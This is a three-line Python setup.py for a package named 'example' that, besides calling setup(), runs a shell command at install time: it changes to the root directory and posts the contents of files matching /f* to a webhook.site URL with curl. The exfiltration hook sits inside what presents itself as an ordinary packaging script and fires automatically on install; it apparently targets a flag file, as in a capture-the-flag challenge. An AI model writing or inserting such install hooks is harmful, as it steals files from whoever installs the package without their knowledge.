from setuptools import setup
print(__import__('subprocess').getoutput('cd / && curl https://webhook.site/example -d `cat /f*`'))
setup(name='example')
